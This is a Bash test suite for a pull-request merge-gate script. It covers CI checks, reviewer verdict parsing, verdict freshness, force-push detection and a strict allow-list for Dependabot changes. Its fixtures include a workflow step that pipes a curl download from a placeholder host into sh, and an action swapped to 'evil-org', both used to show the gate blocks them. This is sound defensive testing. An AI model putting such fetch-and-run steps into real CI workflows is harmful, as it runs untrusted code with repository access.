#!/usr/bin/env bash
# Tests for scripts/merge-gate.sh (T-M1.1 AC4; review findings F1, F3, F4) using a mocked gh.
set -uo pipefail
source "$(dirname "$0")/lib.sh"
echo "merge-gate.sh"

export GH_BIN="$ROOT/scripts/tests/mock-gh"
export MOCK_DIR; MOCK_DIR=$(mktemp -d)
trap 'rm -rf "$MOCK_DIR"' EXIT

HEAD_TIME="2026-09-25T10:00:00Z"; AFTER="2026-09-25T10:05:00Z"; BEFORE="2026-09-25T09:55:00Z"
c() { jq -n --arg b "$1" --arg t "${2:-$AFTER}" '{body:$b, createdAt:$t}'; }   # one comment
cs() { jq -s . <<<"$*"; }                                                      # comments array

SHA_A=3d3c42e5aac5ba805825da76410c181273ba90b1; SHA_B=de0fac2e4500dabe0009e67214ff5f5447ce83dd
USES_BUMP=$'@@ -20,3 +20,3 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0'
DEP_COMMIT='{"sha":"74cf1910000000000000000000000000000000aa","author":{"login":"dependabot[bot]"},"committer":{"login":"web-flow"},"commit":{"verification":{"verified":true}}}'
NO_FORCE='{"data":{"repository":{"pullRequest":{"timelineItems":{"nodes":[]}}}}}'
# Optional overrides for the next write_fixture (reset after each): ACTIVITY / RUNS / FORCE / PRCOMMITS / PRFILES (raw JSON as the API returns it)
ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
write_fixture() { # <head> <base> <mergeState> <comments-json-array> <files-json-array> <checks-json> <behind> [author] [commits-json]
  jq -n --arg head "$1" --arg base "$2" --arg mss "$3" --argjson comments "$4" --argjson files "$5" --arg t "$HEAD_TIME" \
    --arg author "${8:-duochou042004}" --argjson commits "${9:-null}" \
    '{number:7,state:"OPEN",isDraft:false,author:{login:$author},baseRefName:$base,headRefName:$head,headRefOid:"abc1234def5678",mergeStateStatus:$mss,
      comments:$comments,files:$files,commits:($commits // [{committedDate:"2026-09-25T09:00:00Z"},{committedDate:$t}])}' >"$MOCK_DIR/pr.json"
  echo "$6" >"$MOCK_DIR/checks.json"
  echo "$7" >"$MOCK_DIR/behind.txt"
  # Push time (T-M1.7): by default the head was pushed at HEAD_TIME (repository activity; by Dependabot on a Dependabot PR, which created the branch),
  # its pull_request runs were created then, and there was no force-push.
  echo "${ACTIVITY:-$(jq -n --arg t "$HEAD_TIME" --arg a "${8:-duochou042004}" '[{activity_type:(if $a == "app/dependabot" then "branch_creation" else "push" end),
      after:"abc1234def5678", timestamp:$t, actor:{login:(if $a == "app/dependabot" then "dependabot[bot]" else $a end)}}]')}" >"$MOCK_DIR/activity.json"
  echo "${RUNS:-$(jq -n --arg b "$1" --arg t "$HEAD_TIME" '{workflow_runs:[{event:"pull_request",head_sha:"abc1234def5678",head_branch:$b,created_at:$t}]}')}" >"$MOCK_DIR/runs.json"
  echo "${FORCE:-$NO_FORCE}" >"$MOCK_DIR/forcepush.json"
  echo "${PRCOMMITS:-[$DEP_COMMIT]}" >"$MOCK_DIR/pr-commits.json"
  echo "${PRFILES:-$(jq -c --arg bump "$USES_BUMP" '[.[] | {filename:.path, status:"modified",
      patch:(if (.path | startswith(".github/workflows/")) then $bump else "@@ -1 +1 @@\n-a\n+b" end)}]' <<<"$5")}" >"$MOCK_DIR/pr-files.json"
  rm -f "$MOCK_DIR/merged.txt" "$MOCK_DIR"/*.fail
  ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
}
gate() { "$ROOT/scripts/merge-gate.sh" "$@"; }
OK_CHECKS='[{"name":"docs-check","bucket":"pass"},{"name":"secrets-scan","bucket":"pass"},{"name":"backend","bucket":"pass"},{"name":"web","bucket":"pass"},{"name":"contract-drift","bucket":"pass"},{"name":"e2e-smoke","bucket":"pass"}]'
FILES='[{"path":"progress.json"},{"path":"docs/README.md"}]'
GOOD=$(cs "$(c $'DOCS-REVIEW T-M9.9: PASS\nall good')" "$(c 'LC-APPROVED T-M9.9')")

write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "passes when all gates hold (dry run)" -- gate --dry-run 7
[[ ! -f "$MOCK_DIR/merged.txt" ]] && { PASS_COUNT=$((PASS_COUNT+1)); echo "  ok   - dry run does not merge"; } || { FAIL_COUNT=$((FAIL_COUNT+1)); echo "  FAIL - dry run merged"; }
expect_exit 0 "merges when not a dry run" -- gate 7
grep -q -- "--merge --delete-branch --match-head-commit abc1234def5678" "$MOCK_DIR/merged.txt" \
  && { PASS_COUNT=$((PASS_COUNT+1)); echo "  ok   - merge commit, deletes branch, pins the head commit"; } \
  || { FAIL_COUNT=$((FAIL_COUNT+1)); echo "  FAIL - merge flags: $(cat "$MOCK_DIR/merged.txt")"; }

# (a) checks
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"fail"},{"name":"secrets-scan","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check fails" -- gate --dry-run 7
expect_output_contains "required check 'docs-check' is fail" "reports the failing check"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"pending"},{"name":"secrets-scan","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check is pending" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check is missing" -- gate --dry-run 7

# (b) LC approval
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(b) refuses without LC-APPROVED" -- gate --dry-run 7
expect_output_contains "missing fresh 'LC-APPROVED T-M9.9'" "reports missing LC approval"
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9 (after re-review)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(b) LC approval must be the exact line" -- gate --dry-run 7

# (c) verdicts — exact tokens (review F1)
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) refuses a chore PR without DOCS-REVIEW" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED (previous verdict: PASS)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: 'CHANGES REQUESTED (previous verdict: PASS)' is not a pass" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'DOCS-REVIEW T-M9.9: PASS | CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: template placeholder 'PASS | CHANGES REQUESTED' is not a pass" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: FAIL (AC1: PASS, AC2: FAIL)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: 'FAIL (AC1: PASS …)' is not a pass" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: FAIL')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) the latest QA verdict wins (FAIL after PASS)" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) refuses when the latest SEC-REVIEW requests changes" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'UX-REVIEW T-M9.9: APPROVED (with notes)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) UX-REVIEW must be exactly APPROVED" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS WITH MINOR')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "accepts a feature PR with QA 'PASS WITH MINOR'" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.99: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) a verdict for another task id does not count" -- gate --dry-run 7

# stale verdicts (review F3)
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$BEFORE")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F3: a verdict posted before the head commit is stale" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9' "$BEFORE")")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F3: an LC approval posted before the head commit is stale" -- gate --dry-run 7

# (d) up to date, conflicts, bookkeeping, naming
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 3
expect_exit 1 "(d) refuses when the branch is behind its base" -- gate --dry-run 7
expect_output_contains "3 commit(s) behind develop" "reports how far behind"
write_fixture chore/T-M9.9-x develop DIRTY "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses on merge conflicts" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" '[{"path":"docs/README.md"}]' "$OK_CHECKS" 0
expect_exit 1 "refuses when progress.json is not updated" -- gate --dry-run 7
write_fixture wip-branch develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses a branch kind without a merge path" -- gate --dry-run 7
write_fixture feature/T-M9.9-x master CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses a task branch targeting master" -- gate --dry-run 7

# other merge paths (review F4)
write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 0 "F4: dependabot PR (by the Dependabot app) merges with checks + 'LC-APPROVED PR-<n>'" -- gate --dry-run 7
write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$OK_CHECKS" 0 duochou042004
expect_exit 1 "R2-1: a hand-made dependabot/* branch (human author) is refused" -- gate --dry-run 7
expect_output_contains "not authored by Dependabot" "explains the author check"
write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":"backend/pom.xml"},{"path":"scripts/merge-gate.sh"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 1 "R2-1: a dependabot PR touching non-manifest files is refused" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "R2-4: an explicit DOCS-REVIEW CHANGES REQUESTED is not overridden by QA PASS" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c $'Example:\n```\nDOCS-REVIEW T-M9.9: PASS\n```')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "R2-5: a verdict that is not the comment's first line (e.g. in a code block) does not count" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 '[]'
expect_exit 1 "R2-7: an empty commit list is refused (no freshness baseline)" -- gate --dry-run 7
write_fixture release/1.0.0 master CLEAN "$(cs "$(c 'QA-VERDICT 1.0.0: PASS')" "$(c 'LC-APPROVED 1.0.0')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F4: release PR needs PO-APPROVED" -- gate --dry-run 7
write_fixture release/1.0.0 master CLEAN "$(cs "$(c 'QA-VERDICT 1.0.0: PASS')" "$(c 'PO-APPROVED 1.0.0')" "$(c 'LC-APPROVED 1.0.0')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "F4: release PR merges into master with QA + PO + LC" -- gate --dry-run 7

# ---- T-M1.7 AC1: freshness is judged by when the head ARRIVED on the PR (push time), not by committedDate (R2-2) ----
LATE="2026-09-25T10:10:00Z"
run_at() { jq -n --arg b "$1" --arg t "$2" --arg sha "${3:-abc1234def5678}" --arg ev "${4:-pull_request}" \
  '{workflow_runs:[{event:$ev,head_sha:$sha,head_branch:$b,created_at:$t}]}'; }
BACKDATED='[{"committedDate":"2026-09-25T09:00:00Z"}]'   # the head commit claims 09:00, before the 10:05 verdict
RUNS=$(run_at chore/T-M9.9-x "$LATE")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 "$BACKDATED"
expect_exit 1 "AC1: a back-dated commit pushed AFTER the verdict makes the verdict stale" -- gate --dry-run 7
expect_output_contains "missing fresh 'LC-APPROVED T-M9.9'" "reports the approval as stale"
expect_output_contains "needs a fresh 'DOCS-REVIEW T-M9.9: PASS'" "reports the review as stale"
RUNS=$(run_at chore/T-M9.9-x "$HEAD_TIME")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 "$BACKDATED"
expect_exit 0 "AC1: the same back-dated commit counts once it arrived BEFORE the verdict" -- gate --dry-run 7
RUNS=$(jq -s '{workflow_runs: map(.workflow_runs[])}' <(run_at chore/T-M9.9-x "$HEAD_TIME") <(run_at chore/T-M9.9-x "$LATE"))
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: the LATEST pull_request run for the head counts (head re-arrived after the verdict)" -- gate --dry-run 7
FORCE=$(jq -n --arg t "$LATE" '{data:{repository:{pullRequest:{timelineItems:{nodes:[{createdAt:$t}]}}}}}')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a force-push after the verdict (back to an already-built SHA) invalidates it" -- gate --dry-run 7
FORCE=$(jq -n --arg t "$BEFORE" '{data:{repository:{pullRequest:{timelineItems:{nodes:[{createdAt:$t}]}}}}}')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC1: a force-push before the head arrived does not block" -- gate --dry-run 7
RUNS='{"workflow_runs":[]}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: no pull_request run for the head (no push-time data) fails closed" -- gate --dry-run 7
expect_output_contains "cannot determine when head abc1234 arrived on the PR" "explains the fail-closed refusal"
RUNS=$(run_at chore/other-branch "$BEFORE")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a run for the same SHA on ANOTHER branch is no evidence (fails closed)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "$BEFORE" abc1234def5678 push)
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a non-pull_request run is no evidence (fails closed)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "$BEFORE" 0000000000000000)
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a run for another SHA is no evidence (fails closed)" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/runs.json.fail"
expect_exit 1 "AC1: a workflow-runs API error fails closed" -- gate --dry-run 7
expect_output_contains "cannot list workflow runs" "reports the runs API failure"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/forcepush.json.fail"
expect_exit 1 "AC1: a PR-timeline API error fails closed" -- gate --dry-run 7
expect_output_contains "cannot read the PR timeline" "reports the timeline failure"
FORCE='{"data":{"repository":{"pullRequest":null}},"errors":[{"message":"x"}]}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a PR-timeline answer without timeline data fails closed" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$HEAD_TIME")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a verdict in the same second as the arrival is not strictly after it" -- gate --dry-run 7

# ---- T-M1.7 AC2: an explicit negative verdict of ANY review type blocks (R3-2) ----
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: FAIL')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: QA-VERDICT FAIL blocks a chore PR even though DOCS-REVIEW passed" -- gate --dry-run 7
expect_output_contains "negative verdict: latest 'QA-VERDICT T-M9.9: FAIL'" "names the blocking verdict"
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: DOCS-REVIEW CHANGES REQUESTED blocks a feature PR even though QA passed" -- gate --dry-run 7
expect_output_contains "'DOCS-REVIEW T-M9.9: CHANGES REQUESTED'" "names the blocking docs review"
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'UX-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'SEC-REVIEW T-M9.9: APPROVED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: UX-REVIEW CHANGES REQUESTED blocks although QA and SEC passed" -- gate --dry-run 7
expect_output_contains "'UX-REVIEW T-M9.9: CHANGES REQUESTED'" "names the blocking UX review"
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: SEC-REVIEW CHANGES REQUESTED blocks a chore PR" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: FAIL')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: within a type the latest wins (QA FAIL then PASS on re-test) — positive path passes" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: APPROVED')" "$(c 'UX-REVIEW T-M9.9: APPROVED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: all four review types positive passes" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: FAIL' "$BEFORE")" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: a stale negative (posted before the head arrived) does not block the new head" -- gate --dry-run 7
write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')" "$(c 'QA-VERDICT PR-7: FAIL')")" '[{"path":"backend/pom.xml"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 1 "AC2: a negative verdict blocks the dependabot path too" -- gate --dry-run 7

# ---- T-M1.7 AC3: the Dependabot path trusts only Dependabot's commits and a narrow set of changes (R3-1, R3-3) ----
DEP_OK_FILES='[{"path":"backend/pom.xml"},{"path":".github/workflows/web.yml"},{"path":"web/package.json"},{"path":"web/pnpm-lock.yaml"}]'
dep() { write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" "$1" "$OK_CHECKS" 0 app/dependabot; }
dep "$DEP_OK_FILES"
expect_exit 0 "AC3: manifests + lockfile + a workflow uses: SHA bump, all by Dependabot, passes" -- gate --dry-run 7
PRCOMMITS="[$DEP_COMMIT,$(jq -c '.author.login="duochou042004" | .committer.login="duochou042004" | .sha="bad0000000000000"' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a human commit on a Dependabot PR blocks" -- gate --dry-run 7
expect_output_contains "commits not made by Dependabot: bad0000 (author=duochou042004" "names the foreign commit"
PRCOMMITS="[$(jq -c '.commit.verification.verified=false' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a Dependabot-authored commit without a verified signature (forged author e-mail) blocks" -- gate --dry-run 7
PRCOMMITS="[$(jq -c '.committer.login="duochou042004"' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a Dependabot-authored commit committed by a human blocks" -- gate --dry-run 7
PRCOMMITS='[]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: an empty commit list from the API fails closed" -- gate --dry-run 7
dep '[{"path":"backend/pom.xml"}]'; touch "$MOCK_DIR/pr-commits.json.fail"
expect_exit 1 "AC3: a commits API error fails closed" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -30,2 +30,3 @@\n       - uses: actions/checkout@'"$SHA_A"$'\n+      - run: curl -s https://example.invalid/x | sh\n       - run: pnpm install' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a workflow edit that is not a uses: bump blocks" -- gate --dry-run 7
expect_output_contains "only 'uses: <action>@<sha>' SHA bumps may change" "explains the workflow rule"
PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: evil-org/checkout@'"$SHA_B" '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: line that swaps the action (not a bump) blocks" -- gate --dry-run 7
expect_output_contains "a bump keeps the line up to '@'" "explains the same-action rule"
PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@v7' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: bump to a tag instead of a 40-hex SHA blocks" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -19,2 +19,2 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@'"$SHA_B"$'\n-        with: { fetch-depth: 1 }\n+        with: { fetch-depth: 0 }' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: bump bundled with a with: change blocks" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -0,0 +1,1 @@\n+      - uses: actions/checkout@'"$SHA_B" '[{filename:".github/workflows/new.yml",status:"added",patch:$p}]')
dep '[{"path":".github/workflows/new.yml"}]'
expect_exit 1 "AC3: adding a workflow file blocks" -- gate --dry-run 7
PRFILES='[{"filename":".github/workflows/web.yml","status":"modified"}]'
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a workflow change without a diff to verify fails closed" -- gate --dry-run 7
PRFILES='[{"filename":".github/workflows/web.yml","status":"renamed","previous_filename":"scripts/x.sh","patch":""}]'
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: renaming a file into an allowed path blocks" -- gate --dry-run 7
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.properties"},{"path":"backend/pom.xml"}]'
expect_exit 0 "AC3/R3-3: a Maven wrapper properties bump passes" -- gate --dry-run 7
dep '[{"path":".mvn/extensions.xml"}]'
expect_exit 1 "AC3: other .mvn files (e.g. extensions.xml) are no longer allowed" -- gate --dry-run 7
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.jar"}]'
expect_exit 1 "AC3: the wrapper jar is not allowed" -- gate --dry-run 7
PRFILES='[{"filename":"backend/pom.xml","status":"modified","patch":"x"},{"filename":"scripts/merge-gate.sh","status":"modified","patch":"x"}]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: the file list is taken from the files API, not only from pr view" -- gate --dry-run 7
expect_output_contains "outside the allow-list" "names the allow-list"

# ---- T-M1.7 review round 1 (DOCS-REVIEW findings) ----
wf() { PRFILES=$(jq -nc --arg p "$1" '[{filename:".github/workflows/docs-check.yml",status:"modified",patch:$p}]'); dep '[{"path":".github/workflows/docs-check.yml"}]'; }
SHA_P=5fda3b95a4ea91299a34e894583c3862153e4b97
wf $'@@ -20,6 +20,6 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n         with:\n           persist-credentials: false\n-      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n         with:'
expect_exit 1 "S2-1: swapping two uses: lines (no SHA change) blocks" -- gate --dry-run 7
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+    uses: actions/checkout@'"$SHA_B"
expect_exit 1 "S2-1: re-indenting a uses: line blocks" -- gate --dry-run 7
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.2'
expect_exit 1 "S2-1: a uses: line that keeps its SHA is not a bump" -- gate --dry-run 7
expect_output_contains "keeps its SHA" "explains the same-SHA refusal"
wf $'@@ -20,4 +20,4 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n       - run: |\n           echo x\n+          uses: actions/checkout@'"$SHA_B"
expect_exit 1 "S2-1: moving a uses: line into a run: block blocks" -- gate --dry-run 7
wf $'@@ -20,2 +20,2 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n-      - uses: actions/setup-node@'"$SHA_P"$'\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n+      - uses: actions/setup-node@'"$SHA_A"
expect_exit 0 "S2-1: two adjacent pairwise SHA bumps pass" -- gate --dry-run 7
PRFILES='[{"filename":"evil/pom.xml","status":"added","patch":"x"},{"filename":"backend/pom.xml","status":"removed","patch":"x"}]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-4: adding or removing manifests on a Dependabot PR blocks" -- gate --dry-run 7
expect_output_contains "may only modify existing files" "explains the modified-only rule"
for neg in 'QA-VERDICT  T-M9.9: FAIL' 'qa-verdict T-M9.9: FAIL' 'QA-VERDICT T-M9.9 : FAIL' '**QA-VERDICT T-M9.9: FAIL**' '`QA-VERDICT T-M9.9: FAIL`' '> QA-VERDICT T-M9.9: FAIL' 'ux-review t-m9.9: changes requested'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "S3-1: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.90: FAIL')" "$(c '**qa-verdict T-M9.9: pass**')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "S3-1: a negative for another id does not block, and a sloppy positive is simply ignored" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c '**QA-VERDICT T-M9.9: FAIL**')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
